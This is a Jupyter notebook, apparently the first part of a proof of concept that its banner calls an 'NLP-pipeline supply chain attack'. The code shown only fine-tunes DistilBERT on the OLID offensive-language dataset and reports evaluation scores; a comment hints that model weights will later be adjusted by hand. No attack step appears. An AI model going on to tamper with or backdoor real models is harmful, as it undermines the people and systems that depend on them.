{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "#       ___                       ___           ___           ___                         ___     \n",
    "#      /  /\\          ___        /  /\\         /  /\\         /  /\\                       /__/\\    \n",
    "#     /  /:/_        /  /\\      /  /:/_       /  /:/_       /  /::\\                     |  |::\\   \n",
    "#    /  /:/ /\\      /  /:/     /  /:/ /\\     /  /:/ /\\     /  /:/\\:\\    ___     ___     |  |:|:\\  \n",
    "#   /  /:/ /::\\    /  /:/     /  /:/ /:/_   /  /:/_/::\\   /  /:/  \\:\\  /__/\\   /  /\\  __|__|:|\\:\\ \n",
    "#  /__/:/ /:/\\:\\  /  /::\\    /__/:/ /:/ /\\ /__/:/__\\/\\:\\ /__/:/ \\__\\:\\ \\  \\:\\ /  /:/ /__/::::| \\:\\\n",
    "#  \\  \\:\\/:/~/:/ /__/:/\\:\\   \\  \\:\\/:/ /:/ \\  \\:\\ /~~/:/ \\  \\:\\ /  /:/  \\  \\:\\  /:/  \\  \\:\\~~\\__\\/\n",
    "#   \\  \\::/ /:/  \\__\\/  \\:\\   \\  \\::/ /:/   \\  \\:\\  /:/   \\  \\:\\  /:/    \\  \\:\\/:/    \\  \\:\\      \n",
    "#    \\__\\/ /:/        \\  \\:\\   \\  \\:\\/:/     \\  \\:\\/:/     \\  \\:\\/:/      \\  \\::/      \\  \\:\\     \n",
    "#      /__/:/          \\__\\/    \\  \\::/       \\  \\::/       \\  \\::/        \\__\\/        \\  \\:\\    \n",
    "#      \\__\\/                     \\__\\/         \\__\\/         \\__\\/                       \\__\\/    \n",
    "#                       Made by: Hd0/Hariama | #PART1: POC\n",
    "\n",
    "# Or in other words, building your very own 21'st century data\n",
    "# courier/NLP-pipeline supply chain attack\n",
    "\n",
    "# Load in all the necessary libraries. Don't forget to run the requirements.txt\n",
    "# file with conda to actually install all these packages. You can do this with\n",
    "# conda install --file requirements.txt\n",
    "\n",
    "# General packages for ML\n",
    "import pandas as pd\n",
    "import torch\n",
    "import numpy as np\n",
    "import matplotlib.pyplot as plt\n",
    "from sklearn.metrics import classification_report\n",
    "import seaborn as sn\n",
    "\n",
    "# Little hacky way to present Collab-esque TQDM-loading in VSCode\n",
    "import tqdm.notebook\n",
    "import sys\n",
    "sys.modules[\"tqdm.auto\"] = tqdm.notebook\n",
    "\n",
    "# A check to see if cuda is available, but really, don't try to run this code\n",
    "# without a GPU, it will take forever\n",
    "cuda_available = torch.cuda.is_available()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Some weights of DistilBertForSequenceClassification were not initialized from the model checkpoint at distilbert-base-uncased and are newly initialized: ['classifier.bias', 'pre_classifier.weight', 'pre_classifier.bias', 'classifier.weight']\n",
      "You should probably TRAIN this model on a down-stream task to be able to use it for predictions and inference.\n"
     ]
    }
   ],
   "source": [
    "# Here we load the transformers and simpletransformers libraries. I like using\n",
    "# simpletransformers because it's a fun abstraction layer, and most\n",
    "# transformers-functionality can be emulated with it very easily. For everything\n",
    "# else, we can extract functions from the OG-transformers library. The first\n",
    "# time you run this cell, the DistilBERT-model will be downloaded under\n",
    "# user/.cache/transfomers\n",
    "\n",
    "# NOTE: Please learn from my mistakes. When initializing/loading a model with\n",
    "# simpletransformers, the actual model chosen in the case of binary\n",
    "# classification is the *ForSequenceClassification. This is what happens when\n",
    "# you rely on abstraction-layers. Anyway, if you load the right\n",
    "# transformer-model directly to manually adjust the weights, the correct\n",
    "# training layers will be initialized downstream\n",
    "from transformers import DistilBertForSequenceClassification\n",
    "from simpletransformers.classification import ClassificationModel\n",
    "\n",
    "model = ClassificationModel('distilbert','distilbert-base-uncased')\n",
    "tokenizer = model.tokenizer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "# This is an artefact I'm leaving in. Here I created the requirements.txt to\n",
    "# make setup for this virtualenv just a little easier\n",
    "\n",
    "# conda list -e > requirements.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Reading in the training/test-data, this is a remnant of my Master in Digital\n",
    "# Text Analysis, where we utilized data from the OLID-competition of 2020 (I\n",
    "# believe, not sure about this!)\n",
    "df = pd.read_csv(r'data\\olid-training-v1.0_cleaned_final.csv')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "# We rename the columns to be in line with what the simpletransformers library\n",
    "# expects\n",
    "df.columns=['id','text','labels']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>id</th>\n",
       "      <th>text</th>\n",
       "      <th>labels</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>86426</td>\n",
       "      <td>ask native americans</td>\n",
       "      <td>OFF</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>90194</td>\n",
       "      <td>home drunk oncomingfist oncomingfist</td>\n",
       "      <td>OFF</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>16820</td>\n",
       "      <td>amazon investigate chinese employee sell inter...</td>\n",
       "      <td>NOT</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>62688</td>\n",
       "      <td>piece shit volcano facewithtearsofjoy</td>\n",
       "      <td>OFF</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>43605</td>\n",
       "      <td>obama want liberal amp illegal red state</td>\n",
       "      <td>NOT</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      id                                               text labels\n",
       "0  86426                               ask native americans    OFF\n",
       "1  90194               home drunk oncomingfist oncomingfist    OFF\n",
       "2  16820  amazon investigate chinese employee sell inter...    NOT\n",
       "3  62688              piece shit volcano facewithtearsofjoy    OFF\n",
       "4  43605           obama want liberal amp illegal red state    NOT"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Let's see what is in the dataframe\n",
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>text</th>\n",
       "      <th>labels</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>ask native americans</td>\n",
       "      <td>OFF</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>home drunk oncomingfist oncomingfist</td>\n",
       "      <td>OFF</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>amazon investigate chinese employee sell inter...</td>\n",
       "      <td>NOT</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>piece shit volcano facewithtearsofjoy</td>\n",
       "      <td>OFF</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>obama want liberal amp illegal red state</td>\n",
       "      <td>NOT</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                text labels\n",
       "0                               ask native americans    OFF\n",
       "1               home drunk oncomingfist oncomingfist    OFF\n",
       "2  amazon investigate chinese employee sell inter...    NOT\n",
       "3              piece shit volcano facewithtearsofjoy    OFF\n",
       "4           obama want liberal amp illegal red state    NOT"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Okay, so here we only call the text and labels-columns out of the dataframe,\n",
    "# because the simpletransformers library can only work with these two fields\n",
    "task_df = df[['text', 'labels']]\n",
    "task_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "# First split in train/test-dataframes, then into train/dev-dataframes. Note that\n",
    "# we do not split into X_train and y_train, because the transformer-model predict \n",
    "# function takes both lists as one\n",
    "from sklearn.model_selection import train_test_split\n",
    "\n",
    "train_df, test_df = train_test_split(task_df, test_size=0.2, shuffle=True, random_state=42, stratify=task_df['labels'])\n",
    "train_df, dev_df = train_test_split(train_df, test_size=0.25, shuffle=True, random_state=42, stratify=train_df['labels'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Gradient accu size: 4\n",
      "Expected steps per epoch: 493\n",
      "Necesarry validation steps per epoch: 123\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "141\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Some weights of DistilBertForSequenceClassification were not initialized from the model checkpoint at distilbert-base-uncased and are newly initialized: ['classifier.bias', 'pre_classifier.weight', 'pre_classifier.bias', 'classifier.weight']\n",
      "You should probably TRAIN this model on a down-stream task to be able to use it for predictions and inference.\n"
     ]
    }
   ],
   "source": [
    "# This is a general hyperparamater-setup of mine to run this model with, it's\n",
    "# something that I designed and kept on using during my Master's. I keep on\n",
    "# using it because it works\n",
    "\n",
    "# Setting up batch size, here we pick 16\n",
    "train_batch_size = 16\n",
    "if train_batch_size % 4 != 0:\n",
    "    raise ValueError('Train_batch_size is not % 4 == 0')\n",
    "\n",
    "# Setting up gradient accumulation size, to lower the total memory needed in my\n",
    "# GPU, as I personally only got 6 GB (I'm a sparse person!)\n",
    "gradient_accu_size = int(64 / train_batch_size)\n",
    "print(f\"Gradient accu size: {gradient_accu_size}\")\n",
    "\n",
    "# Setting up the steps per epoch and validation steps, based on the batch-size\n",
    "# and the total length of the training-dataframe\n",
    "steps_per_epoch = int(np.ceil(len(train_df) / float(train_batch_size)))\n",
    "validation_steps = steps_per_epoch / 4 # Is just a random number to split up the validations, change to flavor\n",
    "print(f\"Expected steps per epoch: {steps_per_epoch}\")\n",
    "print(f\"Necesarry validation steps per epoch: {round(validation_steps)}\")\n",
    "\n",
    "# Little function to figure out the max-length of the total amount of tokens\n",
    "# based on the training-dataframe. Most transfomer-based models only take a max\n",
    "# amount of 512 tokens, so if the longest sequence in the training-dataframe is\n",
    "# shorter, we'll decrease this hyperparameter to not use any useless padding\n",
    "# during training. Green-IT is a necessity, not an option\n",
    "def max_len(tokenizer, text):\n",
    "    token_lens = []\n",
    "\n",
    "    for txt in text:\n",
    "        tokens = tokenizer.encode(txt, max_length=512, truncation=True)\n",
    "        token_lens.append(len(tokens))\n",
    "    max_length=sorted(token_lens, reverse=True)[0]\n",
    "    return max_length\n",
    "\n",
    "# And here we setup the max_length hypeerparameter\n",
    "max_length = max_len(tokenizer, train_df['text'])\n",
    "print(max_length)\n",
    "\n",
    "# So you might notice here, \"hey, I thought we already initialized a model\n",
    "# earlier?\". And you're right, but this was only to extract the tokenizer. Here\n",
    "# we run all arguments for the model to actually train it. Again, the\n",
    "# hyperparameters which are static are just a personal preference (ref., again\n",
    "# in the category \"it-just-works\"). The two labels are defined, as we only have\n",
    "# two classes to classify on\n",
    "model = ClassificationModel('distilbert',\n",
    "                            'distilbert-base-uncased',\n",
    "                            num_labels=2,\n",
    "                            args={'labels_list': [\"OFF\", \"NOT\"],\n",
    "                            'train_batch_size': train_batch_size, \n",
    "                            'gradient_accumulation_steps': gradient_accu_size, \n",
    "                            'learning_rate': 1e-5, \n",
    "                            'num_train_epochs': 5, \n",
    "                            'max_seq_length': max_length,\n",
    "                            'overwrite_output_dir': True,\n",
    "                            'gradient_checkpointing': False,\n",
    "                            'use_early_stopping': True,\n",
    "                            'early_stopping_delt': 0.01,\n",
    "                            'early_stopping_metric': 'eval_loss',\n",
    "                            'early_stopping_metric_minimize': True, \n",
    "                            'early_stopping_patience': 2,\n",
    "                            'evaluate_during_training': True,\n",
    "                            'evaluate_during_training_steps': validation_steps,\n",
    "                            'evaluate_during_training_silent': False,\n",
    "                            'evaluate_each_epoch': True,\n",
    "                            # 'sliding_window': True\n",
    "                            },\n",
    "                            use_cuda=cuda_available)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "# So this is just a little piece to speed up the process, as I've already\n",
    "# trained the model locally. If you're doing this for the first time, inject the\n",
    "# flag to \"True\". This should take around 15 to 20 minutes on a GTX 1060 6GB.\n",
    "# Otherwise you're just going to take the best_model from an earlier training\n",
    "# session. Be sure to have enough space, the outputs will take around 5.5 GBs op\n",
    "# space!\n",
    "def train_or_load(model, train=False):\n",
    "    if train != False:\n",
    "        _, history = model.train_model(train_df, eval_df = dev_df)\n",
    "        model = ClassificationModel(\"distilbert\", r\"outputs\\best_model\")\n",
    "        return model\n",
    "    else:\n",
    "        model = ClassificationModel(\"distilbert\", r\"outputs\\best_model\")\n",
    "        return model\n",
    "\n",
    "model = train_or_load(model)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a3013b1ec1814dba87ca819175790040",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/2628 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fd9741b1aa3b4be4a0fb8fdb6970faa2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Running Evaluation:   0%|          | 0/329 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Here we check the general result of the evaluation of the model on the\n",
    "# dev-dataframe. Should take around half a minute to run\n",
    "result, model_outputs, wrong_predictions = model.eval_model(dev_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Results of model: {'mcc': 0.5350964533281166, 'tp': 1514, 'tn': 579, 'fp': 301, 'fn': 234, 'auroc': 0.8452413147493238, 'auprc': 0.90468145761584, 'eval_loss': 0.45348839339514274}\n"
     ]
    }
   ],
   "source": [
    "# Continuation on the evaluation results\n",
    "print(f\"Results of model: {result}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "750ec36c754b45a094a6a3208c484ff7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/2628 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8076bc0749e640d1b1c3bba3788b1db0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/329 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Here we make predictions with the model based on test-dataframe. Should again\n",
    "# take around half a minute to run\n",
    "predicted, probabilities = model.predict(test_df['text'].to_list())\n",
    "test_df['predicted'] = predicted"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "              precision    recall  f1-score   support\n",
      "\n",
      "         NOT       0.83      0.87      0.85      1748\n",
      "         OFF       0.71      0.64      0.67       880\n",
      "\n",
      "    accuracy                           0.79      2628\n",
      "   macro avg       0.77      0.75      0.76      2628\n",
      "weighted avg       0.79      0.79      0.79      2628\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Print results of classification of hatespeech based on the cleaned OLID data.\n",
    "# Originally the best model (ref., HateBERT) at the time of the contest got around 82% Macro\n",
    "# F1-score, which was done by an entire research team at the University of\n",
    "# Groningen. So anything above 75% is pretty fly for this solo-rider, especially\n",
    "# with such a small model\n",
    "print(classification_report(test_df['labels'], test_df['predicted']))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "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